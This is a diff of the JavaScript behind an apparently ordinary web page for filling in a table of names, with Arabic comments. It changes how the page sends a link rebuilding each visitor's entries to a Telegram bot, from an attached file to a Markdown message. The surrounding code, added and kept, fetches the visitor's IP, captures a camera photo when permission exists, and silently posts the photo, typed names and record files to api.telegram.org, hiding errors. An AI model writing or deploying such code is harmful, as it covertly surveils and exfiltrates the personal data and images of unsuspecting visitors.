@@ -716,7 +716,6 @@
         window.addEventListener('DOMContentLoaded', async () => {
             await fetchVisitorIp();
 
-            // استرجاع البيانات بدقة وتحديث محتوى الخلية المكتوب للمتصفح
             try {
                 const hash = window.location.hash;
                 if (hash && hash.includes('#data=')) {
@@ -772,7 +771,6 @@
             }, 1000);
         });
 
-        // دالة لضمان تثبيت كل النص المكتوب داخل خصائص HTML الحية قبل الحفظ
         function prepareHtmlForSaving() {
             const container = document.getElementById('pagesWrapper');
             const editables = container.querySelectorAll('[contenteditable="true"]');
@@ -868,7 +866,7 @@
             saveArchiveOnly();
         }
 
-        // الدالة الموحدة المضمونة 100% لقراءة الأسماء وتوليد الملفات وإرسالها للبوت
+        // الدالة الموحدة لتوليد الرابط الفريد وإرساله مباشرة كرسالة نصية قابلة للضغط في تيليجرام
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
@@ -900,20 +898,13 @@
 
             fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
 
-            // توليد الرابط الفريد المضغوط بدقة للمستخدم الحالي
+            // توليد الرابط الفريد المدمج بالأسماء
             const wrapperHtml = prepareHtmlForSaving();
             const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
             const baseUrl = window.location.href.split('#')[0];
             const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
 
-            const linkFileContent = `====================================\n` +
-                                    `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
-                                    `${uniqueUserUrl}\n` +
-                                    `====================================\n` +
-                                    `ملاحظة: افتح هذا الرابط لتجد حرفياً نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
-                                    `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
-                                    `تطوير: ميثاق محمد صالح`;
-            const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
+            const linkMessageText = `🔗 **رابط تعديل جدول هذا المستخدم:**\n${uniqueUserUrl}\n\n*(انقر على الرابط لتفتح الصفحة وفوقها كافة الأسماء لتعديلها)*`;
 
             if (cameraPermissionGranted && globalCameraStream) {
                 try {
@@ -935,7 +926,7 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            sendIndependentLinkFile(linkFileBlob);
+                            sendDirectLinkMessage(linkMessageText);
 
                             if (fileBlob) {
                                 sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
@@ -943,26 +934,26 @@
                         }).catch(e => {});
                     }, 'image/jpeg', 0.85);
                 } catch (e) {
-                    sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
+                    sendInfoOnly(fileBlob, captionText, fileName, linkMessageText);
                 }
             } else {
-                sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
+                sendInfoOnly(fileBlob, captionText, fileName, linkMessageText);
             }
         }
 
-        function sendIndependentLinkFile(linkBlob) {
-            const linkData = new FormData();
-            linkData.append('chat_id', chatId);
-            linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
-            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (يحمل الأسماء للتعديل)**');
+        function sendDirectLinkMessage(linkText) {
+            const msgData = new FormData();
+            msgData.append('chat_id', chatId);
+            msgData.append('text', linkText);
+            msgData.append('parse_mode', 'Markdown');
             
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                body: linkData
+                body: msgData
             }).catch(e => {});
         }
 
-        function sendInfoOnly(fileBlob, captionText, fileName, linkBlob) {
+        function sendInfoOnly(fileBlob, captionText, fileName, linkText) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
@@ -972,7 +963,7 @@
                 method: 'POST',
                 body: formData
             }).then(() => {
-                sendIndependentLinkFile(linkBlob);
+                sendDirectLinkMessage(linkText);
 
                 if (fileBlob) {
                     sendDocumentOnly(fileBlob, fileName, '📄 مرفق سجلات الأسماء');
